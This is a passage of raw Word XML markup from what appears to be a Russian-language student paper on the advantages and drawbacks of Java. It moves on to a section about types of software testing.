          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Преимущества и недостатки</w:t>
      </w:r>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00DD2596">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:bookmarkEnd w:id="6"/>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00BA3D32" w:rsidRDefault="00BA3D32" w:rsidP="00B420AE">
      <w:pPr>
        <w:spacing w:after="0"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073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>реимуществ</w:t>
      </w:r>
      <w:r w:rsidRPr="00853AAF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>а</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00B420AE">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Простота</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Синтаксис языка был унаследован от C++. Сегодня на фоне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Groove</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> или </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Go</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> его трудно назвать простым, однако тогда эволюционный вид позволил привлечь внимание Си-</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>разработчиков.Такая</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> форма конструкций не увеличивает скорость набора, однако читать, понимать и воспроизводить его просто.</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Надёжность</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Надёжность обеспечивается двум</w:t>
      </w:r>
      <w:r w:rsidR="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">я принципами </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>ООП. Иерархия наследования увеличивает читаемость кода и снижает количество невынужденных ошибок.</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Строгая типизация. Разработчику приходится выполнять больший объём работы, но данные интерпретируется однозначно.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00B420AE">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Кроме того, первоначально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предполагался запрет прямого доступа к памяти, что также повышало бы надёжность. Но разработчики оставили несколько лазеек, например </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>бэкдор</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>sun.misc</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>.Unsafe</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>, которые этот запрет обходят.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00B420AE">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Безопасность</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Кроме сохранения общей формы конструкций,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по сравнению с C++ формально лишился двух потенциальных опасностей: указателей и множественного наследования. На деле обе функции сохранены, но представлены в ином виде: вместо указателей используются значения, а в множественном наследовании участвуют не классы, а интерфейсы. Тем не менее, такая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программирования почти исключает возможный урон от невнимательности разработчика.</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Удобство</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Дословно концепция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звучит как: «</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Write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once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anywhere</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">». То есть </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>исполняемость</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> кода не зависит от используемой операционной системы или установленного ПО. Достигается это благодаря транслированию в байт-код виртуальной машиной JVM.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B420AE" w:rsidRDefault="00073DDF" w:rsidP="00B420AE">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Как нельзя кстати пригодилась эта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 </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>android</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>. Разнообразие производителей, моделей телефонов, характеристик — всё это могло бы негативно сказаться на работе приложений, если бы не существование такого универсального инструмента.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00B420AE">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Производительность</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Особенность </w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, связанная с транслированием в байт-код, положительно сказывается и на производительности конечных продуктов. По скорости исполнения однотипные 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уступают в 1,5-2 раза программам на C/C++, при этом превосходят </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>JavaScript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Ruby</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Развитая экосистема</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За 22 года жизни язык оброс десятками IDE и </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>фреймворков</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">, сотнями сообществ и форумов, тысячами библиотек и плагинов. Всё это благоприятно сказывается на пороге вхождения в профессию, востребованности и качеству производимых с помощью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продуктов.</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Безусловно, каждый популярный язык программирования уникален, каждый имеет свои недостатки и преимущества. Особенности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не имеют революционного характера, они незначительны, но вместе с тем фундаментальны. Именно то, что отличает хороший язык от лучшего.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRDefault="00073DDF"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Закончим </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>недостаткими</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> языка</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B420AE" w:rsidRPr="00B420AE" w:rsidRDefault="00B420AE" w:rsidP="00B420AE">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Менее быстрый и более требовательный</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Низкое, в сравнении с другими языками, быстродействие, повышенные требования к объему оперативной памяти (ОП).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B420AE" w:rsidRPr="00B420AE" w:rsidRDefault="00B420AE" w:rsidP="00B420AE">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Большой объем стандартных библиотек и технологий создает сложности в изучении языка.</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Постоянное развитие языка вызывает наличие как устаревших, так и новых средств, имеющих одно и то же функциональное назначение.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B420AE" w:rsidRPr="00B420AE" w:rsidRDefault="00B420AE" w:rsidP="00B420AE">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Узконаправленный</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">. </w:t>
      </w:r>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve">Скорее нейтральное </w:t>
      </w:r>
      <w:proofErr w:type="gramStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>качество</w:t>
      </w:r>
      <w:proofErr w:type="gramEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> чем недостаток но это и делает его </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>узконаправленыым</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> языком так как </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> является полностью объектно-ориентированным языком. Например, C++ тоже является объектно-ориентированным, но в нем есть возможность писать программы не в объектно-ориентированном стиле, а в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> так нельзя.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00B420AE" w:rsidRDefault="00B420AE" w:rsidP="00DD2596">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 xml:space="preserve">Реализован с использованием интерпретации Р-кода (байт-кода). Т.е. программа сначала транслируется в </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>машинонезависимый</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t xml:space="preserve"> Р-код, а потом интерпретируется некоторой программой-интерпретатором (виртуальная </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>Java</w:t>
      </w:r>
      <w:proofErr w:type="spellEnd"/>
      <w:r w:rsidRPr="00B420AE">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>-машина, JVM).</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="005E2C4B" w:rsidRPr="00073DDF" w:rsidRDefault="00B420AE" w:rsidP="0060216E">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:ind w:firstLine="709"/>
        <w:jc w:val="both"/>
        <w:outlineLvl w:val="1"/>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
      </w:pPr>
      <w:bookmarkStart w:id="7" w:name="_Toc10727428"/>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>1.5</w:t>
      </w:r>
      <w:r w:rsidR="00073DDF" w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t xml:space="preserve"> Что такое тестирование и их виды</w:t>
      </w:r>
      <w:bookmarkEnd w:id="7"/>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="00DD2596">
      <w:pPr>
        <w:spacing w:after="0" w:line="360" w:lineRule="auto"/>
        <w:jc w:val="both"/>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bCs/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>Тестирование производительности</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В </w:t>
      </w:r>
      <w:hyperlink r:id="rId23" w:tooltip="Инженерия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инженерии программного обеспечения</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> — </w:t>
      </w:r>
      <w:hyperlink r:id="rId24" w:tooltip="Тестирование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тестирование</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, которое проводится с целью определения, как быстро работает вычислительная система или её часть под определённой </w:t>
      </w:r>
      <w:hyperlink r:id="rId25" w:tooltip="Нагрузка (значения)" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>нагрузкой</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>. Также может служить для проверки и подтверждения других атрибутов качества системы, таких как </w:t>
      </w:r>
      <w:hyperlink r:id="rId26" w:tooltip="Масштабируемость" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>масштабируемость</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t>, </w:t>
      </w:r>
      <w:hyperlink r:id="rId27" w:tooltip="Надёжность" w:history="1">
        <w:r w:rsidRPr="00073DDF">
          <w:rPr>
            <w:rStyle w:val="a4"/>
            <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
            <w:color w:val="000000" w:themeColor="text1"/>
            <w:sz w:val="28"/>
            <w:szCs w:val="28"/>
            <w:u w:val="none"/>
            <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
          </w:rPr>
          <w:t>надёжность</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="000000" w:themeColor="text1"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/>
        </w:rPr>
        <w:t> и потребление ресурсов. Тестирование делится на 6 типов:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00073DDF" w:rsidRPr="00073DDF" w:rsidRDefault="00073DDF" w:rsidP="0060216E">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60216E">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60216E">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 xml:space="preserve">Тестирование </w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>проиводительности</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performance</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60216E">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Регрессионное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>regression</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60216E">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Модульное тестирование (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
          <w:color w:val="222222"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
        </w:rPr>
        <w:t>unit</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B420AE" w:rsidRDefault="00073DDF" w:rsidP="0060216E">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Тестирование безопасности (</w:t>
      </w:r>
      <w:proofErr w:type="spellStart"/>
      <w:r w:rsidRPr="00073DDF">
        <w:rPr>
          <w:rFonts w:ascii="Times New Roman" w:hAnsi="Times New Roman" w:cs="Times New Roman"/>
